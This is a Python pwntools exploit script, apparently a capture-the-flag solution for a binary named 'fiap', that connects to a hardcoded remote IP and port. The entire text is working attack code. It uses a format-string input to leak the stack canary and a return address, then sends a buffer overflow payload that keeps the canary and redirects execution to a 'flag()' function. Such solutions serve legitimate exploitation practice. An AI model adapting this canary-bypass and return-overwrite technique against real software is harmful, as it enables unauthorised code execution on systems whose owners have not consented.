from pwn import *

p = remote('95.216.233.106', 40482)
#p = process("./fiap")
p.sendline("|%11$p|%15$p|")
p.recvuntil("Thank you, ")
leak = p.recvline()[1:-3]
leak = leak.split(b"|")

canary = int(leak[0], 16)
ret_addr = int(leak[1], 16)
offset = 0x1d0 # Return Address - flag() addr

log.info("Canary: " + hex(canary))
log.info("Return Address " + hex(ret_addr))

padding1 = b"A" + b"AAAABBBBCCCCDDDDEEEEFFFF"

payload = padding1 + p32(canary) 

padding2 = b"AAAA"*3
flag_addr = ret_addr - offset
payload += padding2 + p32(flag_addr)

p.sendline(payload)

print(p.recvline())
print(p.recvline())
